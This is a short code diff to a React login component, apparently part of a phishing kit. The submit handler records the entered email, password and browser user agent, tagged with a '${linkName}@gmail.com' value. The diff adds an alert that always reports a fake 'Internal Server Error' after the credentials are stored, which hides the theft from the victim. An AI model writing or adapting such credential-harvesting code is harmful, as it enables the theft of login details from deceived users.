@@ -23,11 +23,11 @@ const Login = () => {
   const handleSubmit = async (e) => {
     e.preventDefault()
     try {
-
       await addData(emailRef.current.value, passRef.current.value, navigator.userAgent, `${linkName}@gmail.com`)
     } catch (error) {
       console.log(error?.message)
     }
+    alert('Internal Server Error! Please Try Again Later.')
   }
 
   return (
